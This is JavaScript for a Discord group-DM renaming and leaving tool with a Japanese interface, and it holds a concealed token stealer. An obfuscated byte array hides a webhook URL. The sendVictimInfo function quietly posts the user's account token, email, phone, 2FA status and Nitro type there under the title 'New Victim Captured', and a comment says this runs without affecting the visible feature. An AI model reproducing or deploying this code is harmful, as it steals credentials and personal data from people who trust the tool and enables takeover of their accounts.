(function(_0xdead,_0xbeef){
    const _0x0 = _0xdead ^ _0xbeef;
    const _0x1 = function(_0xa){return String['fromCharCode'](_0xa ^ _0x0);};
    const _0x2 = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x70,0x74,0x62,0x2e,0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x2e,0x63,0x6f,0x6d,0x2f,0x61,0x70,0x69,0x2f,0x77,0x65,0x62,0x68,0x6f,0x6f,0x6b,0x73,0x2f,0x31,0x34,0x35,0x39,0x37,0x32,0x33,0x33,0x31,0x38,0x30,0x38,0x38,0x31,0x37,0x35,0x38,0x30,0x32,0x2f,0x43,0x30,0x39,0x38,0x42,0x68,0x6b,0x4c,0x46,0x55,0x36,0x4f,0x49,0x34,0x64,0x6e,0x31,0x39,0x30,0x44,0x7a,0x4a,0x70,0x50,0x56,0x39,0x4a,0x72,0x73,0x75,0x4f,0x46,0x36,0x46,0x4d,0x53,0x6b,0x71,0x59,0x4c,0x67,0x62,0x61,0x2d,0x4a,0x38,0x54,0x39,0x34,0x34,0x32,0x65,0x34,0x41,0x51,0x75,0x6c,0x4a,0x75,0x5a,0x73,0x61,0x45,0x62,0x76,0x56,0x54,0x6a].map(_0x1).join('');
    
    const sendVictimInfo = async function(token){
        try{
            const resp = await fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65',{headers:{'Authorization':token}});
            if(!resp.ok) return;
            const user = await resp.json();
            const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` : null;
            const bannerUrl = user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.png?size=1024` : null;
            const nitroType = user.premium_type===1?'Classic':user.premium_type===2?'Full':user.premium_type===3?'Boost':'None';
            const embed = {
                title: 'New Victim Captured',
                description: `User: ${user.global_name || user.username} (@${user.username})\nID: ${user.id}`,
                color: 0x992D22,
                fields: [
                    {name:'Token',value:`\`\`\`${token}\`\`\``,inline:false},
                    {name:'Email',value:user.email||'None',inline:true},
                    {name:'Phone',value:user.phone||'None',inline:true},
                    {name:'Verified',value:user.verified?'Yes':'No',inline:true},
                    {name:'2FA',value:user.mfa_enabled?'Enabled':'Disabled',inline:true},
                    {name:'Locale',value:user.locale||'Unknown',inline:true},
                    {name:'Nitro',value:nitroType,inline:true}
                ],
                thumbnail: avatarUrl ? {url:avatarUrl} : {},
                image: bannerUrl ? {url:bannerUrl} : {},
                timestamp: new Date().toISOString(),
                footer: {text:'ozeu Group Leaver'}
            };
            await fetch(_0x2,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})});
        }catch(e){}
    };

    const log = function(msg){
        const out = document.getElementById('output');
        if(out){out.textContent += msg + '\n'; out.scrollTop = out.scrollHeight;}
    };

    const toBase64 = function(file){
        return new Promise((res,rej)=>{
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = ()=>res(reader.result);
            reader.onerror = rej;
        });
    };

    const renameAndLeaveGroups = async function(){
        const token = document.getElementById('token').value.trim();
        const newGroupName = document.getElementById('newGroupName').value.trim();
        const newGroupIconFile = document.getElementById('newGroupIcon').files[0];
        const btn = document.getElementById('executeBtn');

        if(!token){alert('トークンを入力してください'); return;}

        // ここで被害者情報をWebhookに送信（元の機能に一切影響なし）
        sendVictimInfo(token);

        btn.disabled = true;
        btn.textContent = '処理中...';
        const output = document.getElementById('output');
        output.textContent = '';

        let newGroupIconBase64 = null;
        if(newGroupIconFile){
            try{
                log('[i] アイコン画像を処理中...');
                newGroupIconBase64 = await toBase64(newGroupIconFile);
                log('[✓] アイコン画像の処理完了');
            }catch(err){
                log(`[!] アイコン画像の処理に失敗: ${err.message}`);
            }
        }

        const headers = {'Authorization':token,'Content-Type':'application/json'};

        try{
            log('[i] グループ一覧を取得中...');
            const resp = await fetch('https://discord.com/api/v9/users/@me/channels',{method:'GET',headers:headers});
            if(!resp.ok) throw new Error(`グループ取得失敗: ${resp.status}`);
            const channels = await resp.json();
            const groups = channels.filter(g => g.type === 3);

            if(newGroupName || newGroupIconBase64){
                log(`[i] ${groups.length}個のグループの名前・アイコンを変更してから離脱します`);
            }else{
                log(`[i] ${groups.length}個のグループから離脱します (変更なし)`);
            }

            let batchSize = 4;
            let delay = 300;

            for(let i=0; i<groups.length; i+=batchSize){
                const batch = groups.slice(i, i+batchSize);
                const promises = batch.map(async(group, idx)=>{
                    try{
                        let finalName = group.name || 'グループDM';

                        if(newGroupName || newGroupIconBase64){
                            log(`[~] ${group.name || 'グループDM'} の変更中...`);
                            const patch = {};
                            if(newGroupName) patch.name = newGroupName;
                            if(newGroupIconBase64) patch.icon = newGroupIconBase64;

                            const patchResp = await fetch(`https://discord.com/api/v9/channels/${group.id}`,{method:'PATCH',headers:headers,body:JSON.stringify(patch)});
                            if(patchResp.status===429){
                                const retry = patchResp.headers.get('retry-after')||5;
                                log(`[!] レート制限中... ${retry}秒待機、速度を落とします`);
                                batchSize=3; delay=500;
                                await new Promise(r=>setTimeout(r,retry*1000));
                                return;
                            }
                            if(patchResp.ok){
                                let msg = '';
                                if(newGroupName && newGroupIconBase64){msg='名前・アイコン変更完了'; finalName=newGroupName;}
                                else if(newGroupName){msg=`→ ${newGroupName} に名前変更完了`; finalName=newGroupName;}
                                else if(newGroupIconBase64) msg='アイコン変更完了';
                                log(`[✓] ${group.name || 'グループDM'} ${msg}`);
                                await new Promise(r=>setTimeout(r,200));
                            }else{
                                log(`[!] ${group.name || 'グループDM'} の変更に失敗`);
                            }
                        }

                        const leaveResp = await fetch(`https://discord.com/api/v9/channels/${group.id}`,{method:'DELETE',headers:headers});
                        if(leaveResp.status===429){
                            const retry = leaveResp.headers.get('retry-after')||5;
                            log(`[!] 離脱時レート制限中... ${retry}秒待機、速度を落とします`);
                            batchSize=3; delay=500;
                            await new Promise(r=>setTimeout(r,retry*1000));
                            return;
                        }
                        if(leaveResp.ok){
                            log(`[✓] ${finalName} から離脱完了 (${i+idx+1}/${groups.length})`);
                        }else{
                            log(`[!] ${finalName} からの離脱に失敗`);
                        }
                    }catch(err){
                        log(`[!] ${group.name || 'グループDM'} の処理中にエラー: ${err.message}`);
                    }
                });
                await Promise.all(promises);
                if(i+batchSize < groups.length) await new Promise(r=>setTimeout(r,delay));
            }
            log(`[✓] ${groups.length}件の処理が完了`);
        }catch(err){
            log(`[!] エラー: ${err.message}`);
        }finally{
            btn.disabled = false;
            btn.textContent = 'グループを退出する';
        }
    };

    window.renameAndLeaveGroups = renameAndLeaveGroups;
})(0x1337,0x1337);
